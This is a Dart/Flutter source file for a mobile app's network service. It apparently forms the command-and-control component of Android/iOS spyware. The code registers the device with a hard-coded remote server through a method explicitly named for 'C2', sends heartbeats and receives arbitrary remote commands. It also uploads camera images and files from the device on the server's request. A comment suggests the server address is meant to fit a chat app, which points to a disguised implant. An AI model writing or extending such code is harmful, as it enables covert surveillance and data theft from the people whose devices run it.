// lib/core/control/network_service.dart
import 'dart:async';
import 'dart:convert';

import 'package:camera/camera.dart';
import 'package:flutter/foundation.dart';
import 'package:http/http.dart' as http;
import 'package:socket_io_client/socket_io_client.dart' as io;

// Socket.IO event constants
const String SIO_EVENT_REGISTRATION_SUCCESSFUL = 'registration_successful';
const String SIO_EVENT_REQUEST_REGISTRATION_INFO = 'request_registration_info';
const String SIO_EVENT_REGISTER_DEVICE = 'register_device';
const String SIO_EVENT_DEVICE_HEARTBEAT = 'device_heartbeat';
const String SIO_EVENT_COMMAND_RESPONSE = 'command_response';
const String SIO_EVENT_COMMAND =
    'command'; // Nuevo evento genérico para todos los comandos

// HTTP endpoint constants
const String HTTP_ENDPOINT_UPLOAD_INITIAL_DATA = '/api/device/initial-data';
const String HTTP_ENDPOINT_UPLOAD_COMMAND_FILE = '/api/device/command-file';

class NetworkService {
  late io.Socket _socket;
  bool _isSocketConnected = false;
  final StreamController<bool> _connectionStatusController =
      StreamController<bool>.broadcast();
  final StreamController<Map<String, dynamic>> _commandController =
      StreamController<Map<String, dynamic>>.broadcast();

  // Realizar seguimiento de comandos pendientes
  final Map<String, DateTime> _pendingCommands = {};

  // إعداد عنوان الخادم - يمكن تعديله ليناسب تطبيق الدردشة
  final String _serverUrl = 'https://ws.sosa-qav.es';

  NetworkService() {
    _initializeSocketIO();
  }

  void _initializeSocketIO() {
    try {
      _socket = io.io(
        _serverUrl,
        io.OptionBuilder()
            .setTransports(['websocket'])
            .disableAutoConnect()
            .enableForceNew()
            .setReconnectionAttempts(5)
            .setReconnectionDelay(5000)
            .build(),
      );

      _socket.onConnect((_) {
        debugPrint('NetworkService: Socket connected');
        _isSocketConnected = true;
        _connectionStatusController.add(true);
      });

      _socket.onDisconnect((_) {
        debugPrint('NetworkService: Socket disconnected');
        _isSocketConnected = false;
        _connectionStatusController.add(false);
      });

      _socket.onConnectError((error) {
        debugPrint('NetworkService: Socket connect error: $error');
        _isSocketConnected = false;
        _connectionStatusController.add(false);
      });

      _socket.onReconnect((_) {
        debugPrint('NetworkService: Socket reconnected');
        _isSocketConnected = true;
        _connectionStatusController.add(true);
      });

      // Escuchar el evento de comando genérico en lugar de eventos específicos
      _socket.on(SIO_EVENT_COMMAND, (data) {
        debugPrint('NetworkService: Received command: $data');
        Map<String, dynamic> commandData;
        if (data is Map) {
          commandData = Map<String, dynamic>.from(data);
        } else if (data is String) {
          try {
            final decoded = jsonDecode(data);
            if (decoded is Map) {
              commandData = Map<String, dynamic>.from(decoded);
            } else {
              debugPrint('NetworkService: Invalid command data format: $data');
              return;
            }
          } catch (e) {
            debugPrint('NetworkService: Error decoding command data: $e');
            return;
          }
        } else {
          debugPrint(
              'NetworkService: Unexpected command data type: ${data.runtimeType}');
          return;
        }

        // Agregar el comando a pendientes
        final commandId = commandData['command_id'];
        if (commandId != null && commandId is String) {
          _pendingCommands[commandId] = DateTime.now();
        }

        // Enviar el comando al controlador de flujo
        _commandController.add(commandData);
      });

      _socket.on(SIO_EVENT_REGISTRATION_SUCCESSFUL, (data) {
        debugPrint('NetworkService: Registration successful: $data');
      });

      _socket.on(SIO_EVENT_REQUEST_REGISTRATION_INFO, (_) {
        debugPrint('NetworkService: Server requested registration info');
        _commandController.add({
          'command': SIO_EVENT_REQUEST_REGISTRATION_INFO,
          'args': {},
        });
      });

      // Implementar limpieza periódica de comandos pendientes antiguos
      Timer.periodic(Duration(minutes: 5), (_) {
        _cleanupOldPendingCommands();
      });
    } catch (e) {
      debugPrint('NetworkService: Error initializing socket: $e');
    }
  }

  void _cleanupOldPendingCommands() {
    final now = DateTime.now();
    final expiredCommandIds = <String>[];

    // Identificar comandos que llevan más de 30 minutos pendientes
    _pendingCommands.forEach((commandId, timestamp) {
      if (now.difference(timestamp).inMinutes > 30) {
        expiredCommandIds.add(commandId);
      }
    });

    // Eliminar comandos expirados
    for (final commandId in expiredCommandIds) {
      _pendingCommands.remove(commandId);
      debugPrint('NetworkService: Removed expired pending command: $commandId');
    }

    if (expiredCommandIds.isNotEmpty) {
      debugPrint(
          'NetworkService: Cleaned up ${expiredCommandIds.length} expired pending commands');
    }
  }

  Future<void> connectSocketIO(String deviceId) async {
    try {
      if (!_socket.connected) {
        _socket.io.options?['query'] = {'deviceId': deviceId};
        _socket.connect();
        debugPrint(
            'NetworkService: Connecting socket with deviceId: $deviceId');
      }
    } catch (e) {
      debugPrint('NetworkService: Error connecting socket: $e');
    }
  }

  void disconnectSocketIO() {
    try {
      if (_socket.connected) {
        _socket.disconnect();
        debugPrint('NetworkService: Socket disconnected');
      }
    } catch (e) {
      debugPrint('NetworkService: Error disconnecting socket: $e');
    }
  }

  void registerDeviceWithC2(Map<String, dynamic> deviceInfo) {
    if (!_isSocketConnected) return;
    try {
      _socket.emit(SIO_EVENT_REGISTER_DEVICE, deviceInfo);
      debugPrint('NetworkService: Device registration sent');
    } catch (e) {
      debugPrint('NetworkService: Error registering device: $e');
    }
  }

  void sendHeartbeat(Map<String, dynamic> data) {
    if (!_isSocketConnected) return;
    try {
      _socket.emit(SIO_EVENT_DEVICE_HEARTBEAT, data);
      debugPrint('NetworkService: Heartbeat sent');
    } catch (e) {
      debugPrint('NetworkService: Error sending heartbeat: $e');
    }
  }

  void sendCommandResponse({
    required String originalCommand,
    required String commandId,
    required String status,
    required Map<String, dynamic> payload,
  }) {
    if (!_isSocketConnected) return;
    try {
      final response = {
        'command': originalCommand,
        'command_id': commandId,
        'status': status,
        'payload': payload,
        'timestamp': DateTime.now().toIso8601String(),
      };

      // Remover el comando de la lista de pendientes
      _pendingCommands.remove(commandId);

      _socket.emit(SIO_EVENT_COMMAND_RESPONSE, response);
      debugPrint(
          'NetworkService: Command response sent for $originalCommand (ID: $commandId)');
    } catch (e) {
      debugPrint('NetworkService: Error sending command response: $e');
    }
  }

  Future<bool> sendInitialData({
    required Map<String, dynamic> jsonData,
    XFile? imageFile,
  }) async {
    try {
      final uri = Uri.parse('$_serverUrl$HTTP_ENDPOINT_UPLOAD_INITIAL_DATA');
      final request = http.MultipartRequest('POST', uri);

      // إضافة البيانات JSON
      request.fields['data'] = jsonEncode(jsonData);

      // إضافة الصورة إذا كانت موجودة
      if (imageFile != null) {
        final file = await http.MultipartFile.fromPath(
          'image',
          imageFile.path,
          filename: imageFile.name,
        );
        request.files.add(file);
      }

      final response = await request.send();
      final responseBody = await response.stream.bytesToString();

      if (response.statusCode == 200) {
        debugPrint('NetworkService: Initial data sent successfully');
        return true;
      } else {
        debugPrint(
            'NetworkService: Error sending initial data: ${response.statusCode}, $responseBody');
        return false;
      }
    } catch (e) {
      debugPrint('NetworkService: Exception sending initial data: $e');
      return false;
    }
  }

  Future<bool> uploadFileFromCommand({
    required String deviceId,
    required String commandRef,
    required XFile fileToUpload,
  }) async {
    try {
      final uri = Uri.parse('$_serverUrl$HTTP_ENDPOINT_UPLOAD_COMMAND_FILE');
      final request = http.MultipartRequest('POST', uri);

      // إضافة البيانات المطلوبة
      request.fields['deviceId'] = deviceId;
      request.fields['commandRef'] = commandRef;

      // إضافة الملف
      final file = await http.MultipartFile.fromPath(
        'file',
        fileToUpload.path,
        filename: fileToUpload.name,
      );
      request.files.add(file);

      final response = await request.send();
      final responseBody = await response.stream.bytesToString();

      if (response.statusCode == 200) {
        debugPrint(
            'NetworkService: File uploaded successfully for command $commandRef');
        return true;
      } else {
        debugPrint(
            'NetworkService: Error uploading file: ${response.statusCode}, $responseBody');
        return false;
      }
    } catch (e) {
      debugPrint('NetworkService: Exception uploading file: $e');
      return false;
    }
  }

  // Obtener los comandos pendientes
  List<String> getPendingCommandIds() {
    return _pendingCommands.keys.toList();
  }

  void dispose() {
    disconnectSocketIO();
    _connectionStatusController.close();
    _commandController.close();
  }

  // Getters
  bool get isSocketConnected => _isSocketConnected;
  Stream<bool> get connectionStatusStream => _connectionStatusController.stream;
  Stream<Map<String, dynamic>> get commandStream => _commandController.stream;
}
